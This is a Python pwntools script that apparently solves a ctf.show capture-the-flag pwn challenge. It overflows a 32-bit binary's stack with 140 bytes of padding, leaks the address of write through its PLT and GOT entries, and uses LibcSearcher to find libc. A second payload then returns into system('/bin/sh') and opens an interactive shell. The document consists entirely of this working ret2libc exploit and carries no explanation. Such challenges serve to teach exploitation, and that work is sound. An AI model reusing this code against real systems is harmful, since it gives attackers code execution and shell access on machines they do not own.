from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

p = process('./pwn')
#p = remote('pwn.challenge.ctf.show', 28274)

elf = ELF('./pwn')
ctfshow_addr = elf.sym['ctfshow']
write_plt = elf.plt['write']
write_got = elf.got['write']

pyload = b'A' *140 + p32(write_plt) + p32(ctfshow_addr) + p32(1) + p32(write_got) + p32(4)
p.sendline(pyload)

data = p.recv(4)
write_addr = u32(data)
print(hex(write_addr))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

pyload2 = b'A' *140 + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)
p.sendline(pyload2)
p.interactive()